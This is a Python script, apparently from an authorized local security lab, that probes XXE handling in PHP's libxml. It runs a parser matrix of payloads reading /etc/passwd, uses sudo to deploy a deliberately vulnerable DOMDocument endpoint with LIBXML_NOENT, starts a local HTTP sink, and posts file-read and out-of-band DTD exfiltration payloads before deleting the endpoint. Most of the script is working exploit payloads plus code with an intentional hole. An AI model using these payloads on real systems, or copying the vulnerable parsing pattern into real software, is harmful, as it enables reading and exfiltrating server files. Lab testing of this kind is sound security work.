#!/usr/bin/env python3
# loop3 t4 probe11: B2 完整判定
#  A) 本机解析器矩阵（CLI PHP）：内部实体 / SYSTEM 外部实体 / LIBXML_NOENT 打开后 的行为
#  B) 自建教学靶点（DOMDocument + LIBXML_NOENT）：本地 DTD 受控回显 + file:// 读 /etc/passwd
#     + 去掉 NOENT 的对照端点（禁用外部实体）
#  C) 收尾：删除教学靶点，回读目录确认
# ⚠ 自建靶点 = 我们构造的教学靶点，不计入 bWAPP/DVWA 漏洞数
import json, subprocess, time, datetime, os, re, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

BASE = "http://127.0.0.1"
UA = "loop3-t4/1.0 (authorized local lab)"
TEACH_DIR = "/var/www/html/lo3-teach"
PORT = 8099
LOG = "/tmp/loop3-t4-probe11-sink.jsonl"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:900], flush=True)
    return kw


def sh(c):
    r = subprocess.run(c, shell=True, capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


# ---------- A) 解析器矩阵（本机 PHP CLI，判定 libxml 默认行为） ----------
matrix = {}
php_internal = ("php -r '$x=simplexml_load_string(\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r ["
                "<!ENTITY e \\\"INT-CANARY-7788\\\">]><r><a>&e;</a></r>\"); echo \"a=\".$x->a;' 2>&1 | head -3")
php_ext_none = ("php -r '$x=simplexml_load_string(\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r ["
                "<!ENTITY e SYSTEM \\\"file:///etc/passwd\\\">]><r><a>&e;</a></r>\"); echo \"len=\".strlen($x->a).\" a=\".substr($x->a,0,19);' 2>&1 | head -3")
php_ext_noent = ("php -r '$x=simplexml_load_string(\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r ["
                 "<!ENTITY e SYSTEM \\\"file:///etc/passwd\\\">]><r><a>&e;</a></r>\", \"SimpleXMLElement\", LIBXML_NOENT); "
                 "echo \"len=\".strlen($x->a).\" a=\".substr($x->a,0,19);' 2>&1 | head -3")
php_dom_none = ("php -r '$d=new DOMDocument();$d->loadXML(\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r ["
                "<!ENTITY e SYSTEM \\\"file:///etc/passwd\\\">]><r><a>&e;</a></r>\"); echo \"len=\".strlen($d->textContent);' 2>&1 | head -3")
php_dom_noent = ("php -r '$d=new DOMDocument();$d->loadXML(\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r ["
                 "<!ENTITY e SYSTEM \\\"file:///etc/passwd\\\">]><r><a>&e;</a></r>\", LIBXML_NOENT|LIBXML_DTDLOAD); "
                 "echo \"len=\".strlen($d->textContent).\" a=\".substr($d->textContent,0,19);' 2>&1 | head -3")
php_dom_noent_nonet = ("php -r '$d=new DOMDocument();$d->loadXML(\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r ["
                       "<!ENTITY e SYSTEM \\\"file:///etc/passwd\\\">]><r><a>&e;</a></r>\", LIBXML_NOENT|LIBXML_NONET); "
                       "echo \"len=\".strlen($d->textContent).\" a=\".substr($d->textContent,0,19);' 2>&1 | head -3")
matrix["simplexml_internal_entity"] = sh(php_internal)
matrix["simplexml_SYSTEM_no_flag"] = sh(php_ext_none)
matrix["simplexml_SYSTEM_LIBXML_NOENT"] = sh(php_ext_noent)
matrix["DOMDocument_SYSTEM_no_flag"] = sh(php_dom_none)
matrix["DOMDocument_SYSTEM_NOENT_DTDLOAD"] = sh(php_dom_noent)
matrix["DOMDocument_SYSTEM_NOENT_NONET"] = sh(php_dom_noent_nonet)
rec("A_parser_matrix", **matrix)

# ---------- sink for OOB ----------
class Sink(BaseHTTPRequestHandler):
    def _l(self, m):
        n = int(self.headers.get("Content-Length") or 0)
        b = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        e = {"at": datetime.datetime.now().isoformat(), "method": m, "path": self.path,
             "headers": dict(self.headers), "body": b[:2000]}
        open(LOG, "a").write(json.dumps(e, ensure_ascii=False) + "\n")
        print("SINK_HIT " + json.dumps(e, ensure_ascii=False)[:400], flush=True)

    def do_GET(self):
        self._l("GET")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"oob-ok")

    def do_POST(self):
        self._l("POST")
        self.send_response(200)
        self.end_headers()

    def log_message(self, *a):
        pass


srv = HTTPServer(("127.0.0.1", PORT), Sink)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.4)
rec("sink_up", port=PORT, bind="127.0.0.1", log=LOG)

# ---------- B) 自建教学靶点 ----------
PHP_NOENT = """<?php
// ===== loop3 t4 B2 自建教学靶点（SELF-BUILT / TEACHING ONLY）=====
// 用途：受控 XXE 验证（本地 DTD 回显 + file:// 读取 + 对照）
// 部署：由 security/learning/_evidence/loop3-t4-probe11.py 写入 %s
// 删除：sudo -n rm -rf %s
$body = file_get_contents("php://input");
if ($body === "") { http_response_code(400); echo "no body"; exit; }
$doc = new DOMDocument();
$ok = $doc->loadXML($body, LIBXML_NOENT | LIBXML_DTDLOAD);   // ← 故意打开外部实体
echo "LO3_TEACH_NOENT=1\\n";
echo $doc->textContent;
"""
PHP_NOFLAG = """<?php
// ===== loop3 t4 B2 自建教学靶点（对照端点：不传 LIBXML_NOENT）=====
$body = file_get_contents("php://input");
if ($body === "") { http_response_code(400); echo "no body"; exit; }
$doc = new DOMDocument();
$ok = $doc->loadXML($body);   // ← 未开启外部实体
echo "LO3_TEACH_NOENT=0\\n";
echo $doc->textContent;
"""
DTD = ('<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
       '<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM \'http://127.0.0.1:' + str(PORT) + '/LO3DTD-%file;\'>">\n'
       '%eval;\n%err;\n')

sh(f"sudo -n mkdir -p {TEACH_DIR} && sudo -n chown -R www-data:www-data {TEACH_DIR}")
open("/tmp/lo3_noent.php", "w").write(PHP_NOENT % (TEACH_DIR, TEACH_DIR))
open("/tmp/lo3_noflag.php", "w").write(PHP_NOFLAG)
open("/tmp/lo3_evil.dtd", "w").write(DTD)
rec("B_deploy_cmd", cmd=f"cp /tmp/lo3_noent.php {TEACH_DIR}/noent.php; cp /tmp/lo3_noflag.php {TEACH_DIR}/noflag.php; cp /tmp/lo3_evil.dtd {TEACH_DIR}/evil.dtd")
rec("B_deploy_result", v=sh(f"sudo -n cp /tmp/lo3_noent.php {TEACH_DIR}/noent.php && sudo -n cp /tmp/lo3_noflag.php {TEACH_DIR}/noflag.php && sudo -n cp /tmp/lo3_evil.dtd {TEACH_DIR}/evil.dtd && sudo -n ls -la {TEACH_DIR}"))
rec("B_dtd_source", path=f"{TEACH_DIR}/evil.dtd", content=DTD)
rec("B_endpoint_source_noent", path=f"{TEACH_DIR}/noent.php", content=PHP_NOENT % (TEACH_DIR, TEACH_DIR))
rec("B_endpoint_source_noflag", path=f"{TEACH_DIR}/noflag.php", content=PHP_NOFLAG)

T_NOENT = f"{BASE}/lo3-teach/noent.php"
T_NOFLAG = f"{BASE}/lo3-teach/noflag.php"


def post(url, body, tag):
    time.sleep(1.2)
    n0 = sum(1 for _ in open(LOG)) if os.path.exists(LOG) else 0
    r = requests.post(url, data=body.encode(), headers={"Content-Type": "text/xml; charset=UTF-8"}, timeout=25)
    time.sleep(1.5)
    new = []
    if os.path.exists(LOG):
        new = [json.loads(l) for l in open(LOG)][n0:]
    return rec(tag, url=url, status=r.status_code, resp=re.sub(r"\s+", " ", r.text)[:300],
               oob_new=len(new), oob_paths=[h["path"][:160] for h in new])


# B1: 内部实体（受控回显）
post(T_NOENT, '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e "LO3-INTERNAL-CANARY-9911">]><r>&e;</r>',
     "B1_internal_entity_echo")
# B2: SYSTEM 外部实体读 /etc/passwd（NOENT 打开）
post(T_NOENT, '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>',
     "B2_file_entity_passwd_NOENT")
# B3: 对照端点（不传 NOENT）
post(T_NOFLAG, '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>',
     "B3_file_entity_passwd_NOFLAG_control")
# B4: 对照端点 内部实体
post(T_NOFLAG, '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e "LO3-INTERNAL-CANARY-9911">]><r>&e;</r>',
     "B4_internal_entity_NOFLAG_control")
# B5: 本地 DTD 加载（file:// 指向本机 DTD 文件）→ 受控回显
post(T_NOENT, '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "file:///tmp/lo3_evil.dtd"> %d;]><r>x</r>',
     "B5_local_file_dtd_load")
# B6: 远程 DTD（本机 sink）+ 错误回显外带
post(T_NOENT, ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://127.0.0.1:' + str(PORT) + '/lo3dtd-remote.dtd"> %d;]><r>x</r>'),
     "B6_remote_dtd_oob")

# ---------- C) 收尾：删除教学靶点 ----------
rec("C_remove_cmd", cmd=f"sudo -n rm -rf {TEACH_DIR}")
rec("C_remove_result", v=sh(f"sudo -n rm -rf {TEACH_DIR}; ls -la /var/www/html/ | grep -c lo3-teach || echo '0 (removed)'"))
rec("C_verify_removed", http_status=requests.get(T_NOENT, timeout=10).status_code)
rec("C_docroot", v=sh("ls -la /var/www/html/"))

with open("/tmp/loop3-t4-probe11.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
srv.shutdown()
print(json.dumps({"rc": "ok", "sink_hits": sum(1 for _ in open(LOG))}))
